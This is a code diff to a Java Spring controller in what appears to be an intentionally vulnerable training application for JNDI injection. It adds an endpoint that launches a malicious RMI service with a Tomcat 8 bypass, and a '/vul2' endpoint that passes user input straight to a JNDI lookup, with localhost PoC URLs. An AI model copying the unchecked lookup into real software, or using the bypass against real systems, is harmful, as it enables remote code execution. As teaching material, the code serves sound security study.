@@ -33,6 +33,17 @@ public class JNDIInject {
     }
 
     /**
+     * 接口开启一个远程的恶意rmi服务，Tomcat8 By Pass
+     */
+    @ApiOperation(value = "op：开启远程rmi服务，Tomcat8 By Pass")
+    @GetMapping("/openrmibypass")
+    public String openRmiByPass() throws Exception {
+        log.info("[op] 开启远程rmi服务...");
+        new Tomcat8Bypass().register();
+        return "ok";
+    }
+
+    /**
      * lookup 方法会将传入的参数当作 JNDI 名称，如果参数值包含恶意的 JNDI 名称，那么攻击者就可以通过这种方式来执行任意的 JNDI 操作。
      * lookup：通过名字检索执行的对象，当lookup()方法的参数可控时，攻击者便能提供一个恶意的url地址来加载恶意类。
      * PoC http://127.0.0.1:8888/JNDI/vul?content=rmi://127.0.0.1:1099/hello
@@ -49,6 +60,24 @@ public class JNDIInject {
         }
         return "JNDI注入";
     }
+
+
+    /**
+     * PoC http://127.0.0.1:8888/JNDI/vul2?content=rmi://127.0.0.1:2099/calc
+     */
+    @ApiOperation(value = "vul：JNDI注入ByPass")
+    @GetMapping("/vul2")
+    public String vul2(String content) {
+        log.info("[vul] JNDI注入：" + content);
+        try {
+            Context ctx = new InitialContext();
+            ctx.lookup(content);
+        } catch (Exception e) {
+            log.warn("JNDI错误消息");
+        }
+        return "JNDI注入";
+    }
+
 
     @ApiOperation(value = "safe：正则拦截")
     @GetMapping("/safe1")
